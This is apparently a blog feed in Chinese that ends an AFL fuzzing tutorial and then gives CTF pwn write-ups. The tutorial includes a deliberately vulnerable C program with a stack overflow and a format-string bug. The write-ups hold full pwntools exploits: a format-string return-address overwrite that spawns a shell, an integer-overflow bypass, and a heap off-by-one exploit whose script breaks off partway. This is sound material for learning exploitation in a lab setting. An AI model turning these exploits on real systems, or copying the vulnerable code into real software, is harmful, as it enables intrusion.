class="string">'/dev/null'</span>.</span><br></pre></td></tr></table></figure><p>使用不同的输入，正常情况下afl-showmap会捕获到不同的tuples，这就说明我们的的插桩是有效的，还有前面提到的afl-cmin就是通过这个工具来去掉重复的输入文件。</p><h4 id="2-执行fuzzer"><a href="#2-执行fuzzer" class="headerlink" title="(2) 执行fuzzer"></a>(2) 执行fuzzer</h4><p>在执行afl-fuzz前，如果系统配置为将核心转储文件（core）通知发送到外部程序。 将导致将崩溃信息发送到Fuzzer之间的延迟增大，进而可能将崩溃被误报为超时，所以我们得临时修改core_pattern文件，如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><p>之后就可以执行afl-fuzz了，通常的格式是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program [params]</span><br></pre></td></tr></table></figure><p>或者使用“@@”替换输入文件，Fuzzer会将其替换为实际执行的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure><p>如果没有什么错误，Fuzzer就正式开始工作了。首先，对输入队列中的文件进行预处理；然后给出对使用的语料库可警告信息，比如下图中提示有个较大的文件（14.1KB），且输入文件过多；最后，开始Fuzz主循环，显示状态窗口。</p><p>测试源代码:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'A'</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'F'</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"it is good!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>AFL状态窗口</p><p><img alt="" data-src="https://i.loli.net/2019/11/17/tD5GNCSJ4nAxukH.png" class="lozad"></p><p>① Process timing:Fuzzer运行时长、以及距离最近发现的路径、崩溃和挂起经过了多长时间。</p><p>② Overall results：Fuzzer当前状态的概述。</p><p>③ Cycle progress：我们输入队列的距离。</p><p>④ Map coverage：目标二进制文件中的插桩代码所观察到覆盖范围的细节。</p><p>⑤ Stage progress：Fuzzer现在正在执行的文件变异策略、执行次数和执行速度。</p><p>⑥ Findings in depth：有关我们找到的执行路径，异常和挂起数量的信息。</p><p>⑦ Fuzzing strategy yields：关于突变策略产生的最新行为和结果的详细信息。</p><p>⑧ Path geometry：有关Fuzzer找到的执行路径的信息。</p><p>⑨ CPU load：CPU利用率</p><h4 id="3-使用screen"><a href="#3-使用screen" class="headerlink" title="(3) 使用screen"></a>(3) 使用screen</h4><p>一次Fuzzing过程通常会持续很长时间，如果这期间运行afl-fuzz实例的终端终端被意外关闭了，那么Fuzzing也会被中断。而通过在screen session中启动每个实例，可以方便的连接和断开。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ screen afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure></p><p>也可以为每个session命名，方便重新连接。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ screen -S fuzzer1$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program [params] @@[detached from 6999.fuzzer1]$ screen -r fuzzer1  ...</span><br></pre></td></tr></table></figure></p><h3 id="2-黑盒测试"><a href="#2-黑盒测试" class="headerlink" title="2. 黑盒测试"></a>2. 黑盒测试</h3><p>所谓黑盒测试，通俗地讲就是对没有源代码的程序进行测试，这时就要用到AFL的QEMU模式了。启用方式和LLVM模式类似，也要先编译。但注意，因为AFL使用的QEMU版本太旧，util/memfd.c中定义的函数memfd_create()会和glibc中的同名函数冲突，在这里可以找到针对QEMU的patch，之后运行脚本build_qemu_support.sh就可以自动下载编译。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libini-config-dev libtool-bin automake bison libglib2.0-dev -y$ </span><br><span class="line">$ <span class="built_in">cd</span> qemu_mode$ build_qemu_support.sh$ <span class="built_in">cd</span> .. &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>现在起，只需添加-Q选项即可使用QEMU模式进行Fuzzing。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-fuzz -Q -i testcase_dir -o findings_dir /path/to/program [params] @@</span><br></pre></td></tr></table></figure></p><h2 id="七-结束测试"><a href="#七-结束测试" class="headerlink" title="七 结束测试"></a>七 结束测试</h2><h3 id="1-何时结束"><a href="#1-何时结束" class="headerlink" title="1.何时结束"></a>1.何时结束</h3><p>检查afl-fuzz工作状态的目的是为何时停止测试提供依据，通常来说符合下面几种情况时就可以停掉了。</p><p>（1）状态窗口中”cycles done”字段颜色变为绿色该字段的颜色可以作为何时停止测试的参考，随着周期数不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。当其变为绿色时，继续Fuzzing下去也很难有新的发现了，这时便可以通过Ctrl-C停止afl-fuzz。</p><p>（2）距上一次发现新路径（或者崩溃）已经过去很长时间了，至于具体多少时间还是需要自己把握，比如长达一个星期或者更久估计大家也都没啥耐心了吧。</p><p>（3）目标程序的代码几乎被测试用例完全覆盖，这种情况好像很少见，但是对于某些小型程序应该还是可能的，至于如何计算覆盖率将在下面介绍。</p><p>（4）上面提到的pythia提供的各种数据中，一旦path covera达到99％（通常来说不太可能），如果不期望再跑出更多crash的话就可以中止fuzz了，因为很多crash可能是因为相同的原因导致的；还有一点就是correctness的值达到1e-08，根据pythia开发者的说法，这时从上次发现path/uniq crash到下一次发现之间大约需要1亿次执行，这一点也可以作为衡量依据。</p><h3 id="2-输出结果"><a href="#2-输出结果" class="headerlink" title="2. 输出结果"></a>2. 输出结果</h3><p>afl-fuzz的输出目录中存在很多文件，有时想要写一个辅助工具可能就要用到其中的文件。下面以多个fuzz实例并行测试时的同步目录为例：<br><img alt="" data-src="https://i.loli.net/2019/11/19/FNkeoOia15yUQXK.png" class="lozad"></p><p>queue：存放所有具有独特执行路径的测试用例。</p><p>crashes：导致目标接收致命signal而崩溃的独特测试用例。</p><p>crashes/README.txt：保存了目标执行这些crash文件的命令行参数。</p><p>hangs：导致目标超时的独特测试用例。</p><p>fuzzer_stats：afl-fuzz的运行状态。</p><p>plot_data：用于afl-plot绘图。</p><h2 id="八-处理测试结果"><a href="#八-处理测试结果" class="headerlink" title="八 处理测试结果"></a>八 处理测试结果</h2><p>到了这里，我们可能已经跑出了一大堆的crashes，那么接下来的步骤，自然是确定造成这些crashes的bug是否可以利用，怎么利用？这是另一个重要方面。当然，个人觉得这比前面提到的内容都要困难得多，这需要对常见的二进制漏洞类型、操作系统的安全机制、代码审计和调试等内容都有一定深度的了解。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;转载于 ：&lt;a href=&quot;https://www.freebuf.com/articles/system/191543.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.freebuf.com/articles/system
      
    
    </summary>
    
      <category term="漏洞挖掘" scheme="https://nocbtm.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
      <category term="漏洞挖掘" scheme="https://nocbtm.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>360杯 pwn writeup</title>
    <link href="https://nocbtm.github.io/2019/11/01/360%E6%9D%AF-pwn-writeup/"/>
    <id>https://nocbtm.github.io/2019/11/01/360杯-pwn-writeup/</id>
    <published>2019-11-01T07:54:33.000Z</published>
    <updated>2019-11-01T13:01:57.331Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>格式化字符串漏洞，但跟平时做的还不太一样，这题输入的数据存到了bss段，<br>任意地址写的时候，不能像平时那样直接写到栈上，解析栈上的数据，这里需要找一个合适的跳板，来修改函数返回地址。<br>当时没有做出来，看了360官方writeup之后，觉得利用的过程很巧妙，学到了一些新的姿势，对栈上的数据又有了更深刻的认识。</p><p><img alt="" data-src="https://raw.githubusercontent.com/https://github.com/nocbtm/picgo/master/img/20191101170357.png" class="lozad"></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ul><li>泄露libc_addr,stack_addr</li><li>突破输入次数的限制，修改i的值</li><li>在跳板写上ret_addr所在的栈地址，再修改ret_addr为onegadget</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level   = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gadgets = [<span class="number">0x3a80c</span>,<span class="number">0x3ac5e</span>,<span class="number">0x3a812</span>,<span class="number">0x3a819</span>,<span class="number">0x5f065</span>,<span class="number">0x5f066</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HL</span><span class="params">(value)</span>:</span></span><br><span class="line"></span><br><span class="line">    lis = []</span><br><span class="line"></span><br><span class="line">    high = value &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    low = value &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">    lis.append(low)</span><br><span class="line"></span><br><span class="line">    lis.append(high)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lis</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input</span><span class="params">(payload)</span>:</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"2. Exit"</span>)</span><br><span class="line"></span><br><span class="line">    p.send(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"something"</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"2. Exit"</span>)</span><br><span class="line"></span><br><span class="line">    p.send(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">## leak address</span></span><br><span class="line"></span><br><span class="line">input(<span class="string">"%5$p%12$p%15$p"</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leaked = p.recvline()</span><br><span class="line"></span><br><span class="line">bin_base = int(leaked[<span class="number">2</span>:<span class="number">10</span>], <span class="number">16</span>) - <span class="number">0x1fb8</span></span><br><span class="line"></span><br><span class="line">stack_addr = int(leaked[<span class="number">12</span>:<span class="number">20</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">var_addr = stack_addr - <span class="number">0x2C</span> + <span class="number">0x3</span></span><br><span class="line"></span><br><span class="line">target_addr = stack_addr - <span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">libc_base = int(leaked[<span class="number">22</span>:<span class="number">30</span>],<span class="number">16</span>) - <span class="number">247</span> - <span class="number">0x18540</span></span><br><span class="line"></span><br><span class="line">shell_addr = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">bp = bin_base + <span class="number">0x81c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *' + str(hex(bp)))</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"binary_base address is %x"</span> % bin_base)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"stack address is %x"</span> % stack_addr)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"libc_base address is %x"</span> % libc_base)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"var address is %x"</span> % var_addr)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"target address is %x"</span> % target_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## Modify var i values</span></span><br><span class="line">lis = HL(var_addr)</span><br><span class="line"><span class="keyword">print</span> lis</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">input(<span class="string">"%"</span> + str(lis[<span class="number">0</span>])  + <span class="string">"c%21$hn"</span>)</span><br><span class="line"></span><br><span class="line">input(<span class="string">"%255d%57$hhn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Write one_gadget at ret_addr through the target_addr</span></span><br><span class="line"></span><br><span class="line">lis = HL(target_addr)</span><br><span class="line"></span><br><span class="line">input(<span class="string">"%"</span> + str(lis[<span class="number">0</span>])  + <span class="string">"c%21$hn"</span>)</span><br><span class="line"></span><br><span class="line">lis = HL(target_addr+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">input(<span class="string">"%"</span> + str(lis[<span class="number">0</span>])  + <span class="string">"d%22$hn"</span>)</span><br><span class="line"></span><br><span class="line">lis = HL(shell_addr)</span><br><span class="line"></span><br><span class="line">input(<span class="string">"%"</span> + str(lis[<span class="number">0</span>])  + <span class="string">"c%57$hn"</span>)</span><br><span class="line"></span><br><span class="line">input(<span class="string">"%"</span> + str(lis[<span class="number">1</span>])  + <span class="string">"c%59$hn"</span>)</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>整数溢出，需要注意的是数值在比较的时候是用本身的数据，而做运算（如加减）的时候，用的是自身的补码。<br>此题输入的字符数中不让有”-“符号。</p><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ul><li>pass1绕过: x1和y1都是有符号整数，令x1为359，y1为0xffffffff就可以绕过判断</li><li>pass2绕过: 利用整数溢出里面的回绕，int类型大小为4个字节，最大存的数为0x00000000ffffffff,若两数相乘为0x0000000100000168    ，产出溢出结果等于0x168</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn2"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"x:"</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(str(<span class="number">359</span>))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"y:"</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(str(<span class="number">2</span>**<span class="number">32</span><span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"Please input x and y:"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    p.sendline(str(<span class="number">8</span>)+<span class="string">" "</span>+str(<span class="number">0x0000000100000168</span>/<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;pwn1&quot;&gt;&lt;a href=&quot;#pwn1&quot; class=&quot;headerlink&quot; title=&quot;pwn1&quot;&gt;&lt;/a&gt;pwn1&lt;/h2&gt;&lt;p&gt;格式化字符串漏洞，但跟平时做的还不太一样，这题输入的数据存到了bss段，&lt;br&gt;任意地址写的时候，不能像平时那样直接写到栈上
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2019 RoarCTF pwn writeup</title>
    <link href="https://nocbtm.github.io/2019/10/14/2019-RoarCTF-pwn-writeup/"/>
    <id>https://nocbtm.github.io/2019/10/14/2019-RoarCTF-pwn-writeup/</id>
    <published>2019-10-14T12:40:35.000Z</published>
    <updated>2020-02-04T02:24:01.131Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>off-by-one漏洞,输入content的时候，可控size的大小;<br>第二次输入size - 第一次输入的size = 10 时，可多输入一字节。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_E26</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; (<span class="keyword">signed</span> <span class="keyword">int</span>)a2 )</span><br><span class="line">    <span class="keyword">return</span> a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )</span><br><span class="line">    LODWORD(result) = a1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = a1;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p><img alt="" data-src="https://raw.githubusercontent.com/https://github.com/nocbtm/picgo/master/img/off_by_one.png" class="lozad"></p><ul><li>利用堆块重叠，修改B的size为B+C的size</li><li>free B , 再malloc B ，就可以泄露C里面的&lt; main_arena+88 &gt;，再减去距离libc_base的偏移，得到libc_base</li><li>再利用堆块重叠，修改E的size为E+F的size</li><li>free E , malloc E+F大小的size，修复F的size，再free F</li><li>把target_addr 写入到F的fd位</li><li>malloc F ,就可以malloc target_addr，达到任意地址写</li></ul><p>但是这题onegadget会失效，需要调整calloc的一些偏移，才能得到shell</p><ul><li>&lt;__malloc_hook&gt;在 &lt; main_arena-0x10&gt;</li><li>&lt;__realloc_hook&gt;在&lt; main_arena-0x18&gt;</li><li>&lt;__memalign_hook&gt;在&lt; main_arena-0x20&gt;</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./easy_pwn"</span>)</span><br><span class="line"><span class="comment">#p = remote("39.97.182.233", 41458)</span></span><br><span class="line">elf = ELF(<span class="string">"./easy_pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>,str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>,str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>,str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>,str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">"content: "</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>,str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>,str(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>,str(index))</span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 3</span></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 4</span></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 6</span></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x68</span>+<span class="number">10</span>,<span class="string">"a"</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+<span class="string">"\xe1"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span 